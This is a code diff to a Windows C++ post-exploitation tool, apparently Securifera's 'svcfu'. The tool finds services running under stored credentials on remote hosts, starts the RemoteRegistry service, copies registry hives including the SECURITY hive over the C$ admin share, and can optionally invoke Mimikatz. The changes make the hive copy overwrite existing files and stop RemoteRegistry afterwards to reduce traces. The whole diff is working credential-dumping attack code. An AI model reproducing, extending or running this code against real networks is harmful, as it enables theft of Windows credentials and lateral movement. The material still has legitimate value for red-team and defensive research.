@@ -1,3 +1,8 @@
+/*	Author:  barbarisch, b0yd
+    Website: https://www.securifera.com
+	License: https://creativecommons.org/licenses/by/4.0/
+*/
+
 #include <stdio.h>
 #include <WS2tcpip.h>
 #include <Windows.h>
@@ -390,7 +395,8 @@ std::vector<std::string> save_remote_reg_hive(std::string target, std::string de
 				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sec.hiv";
 				filePathLocal = destDir + "\\" + SecurityHiveStr;
 
-				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
+				//Overwrite so it shouldn't fail
+				BOOL ret2 = MoveFileExA(filePathRemote.c_str(), filePathLocal.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);
 				if(ret2 == FALSE) {
 					printf("[-] Error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
 					DeleteFileA(filePathRemote.c_str());
@@ -446,22 +452,34 @@ std::vector<std::string> save_remote_reg_hive(std::string target, std::string de
 	return savedFiles;
 }
 
-void start_remote_registry_svc(SC_HANDLE sc, std::string target)
+SC_HANDLE start_remote_registry_svc(SC_HANDLE sc, std::string target)
 {
+	SC_HANDLE ret_svc = NULL;
 	if(!sc)
-		return;
+		return NULL;
 
-	SC_HANDLE svc = OpenServiceA(sc, "RemoteRegistry", SERVICE_START);
-
+	SC_HANDLE svc = OpenServiceA(sc, "RemoteRegistry", SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
 	if(!svc) {
 		printf("[-] Error OpenServiceA: %s\n", GetLastErrorAsString(GetLastError()).c_str());
-		return;
+		return NULL;
 	}
 
-	BOOL ret = StartServiceA(svc, NULL, NULL);
-	if(ret == FALSE) {
-		printf("[-] Error StartServiceA: %s\n", GetLastErrorAsString(GetLastError()).c_str());
+	SERVICE_STATUS retPtr;
+	BOOL ret = QueryServiceStatus( svc, &retPtr );
+	if( ret &&  retPtr.dwCurrentState != SERVICE_RUNNING ){
+
+		ret = StartServiceA(svc, NULL, NULL);
+		if(ret == FALSE) {
+			printf("[-] Error StartServiceA: %s\n", GetLastErrorAsString(GetLastError()).c_str());
+		} else {
+			ret_svc = svc;
+		}
+
+	} else {
+		CloseServiceHandle(svc);
 	}
+
+	return ret_svc;
 }
 
 void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, bool runMimikatz)
@@ -497,10 +515,11 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, 
 		//find all the interesting services
 		DWORD ret_size = 0;
 		find_interesting_services(sc, &svc_arr, &ret_size);
-		printf("[+] Credentialled services: %d\n", ret_size);
+		printf("[+] Credentialed services: %d\n", ret_size);
 					
 		//post processing logic (registry save, mimikatz, and cleanup)
 		std::vector<std::string> savedFiles;
+		SC_HANDLE remote_reg_svc = NULL;
 		if(saveReg) {
 			//if interesting service found
 			//if(ret_size > 0 ) {
@@ -509,7 +528,7 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, 
 			if(local) {
 				savedFiles = save_local_reg_hive(destDir);
 			} else {
-				start_remote_registry_svc(sc, target);
+				remote_reg_svc = start_remote_registry_svc(sc, target);
 				savedFiles = save_remote_reg_hive(target, destDir);
 			}
 			//}
@@ -532,6 +551,12 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, 
 				printf("[-] Mimikatz support not compiled in. Rebuild\n");
 #endif
 			} 
+
+			//Stop the remote registry if we started it
+			if( remote_reg_svc != NULL ){
+				SERVICE_STATUS_PROCESS ssp;
+				ControlService( remote_reg_svc, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssp );
+			}
 
 		} 
 
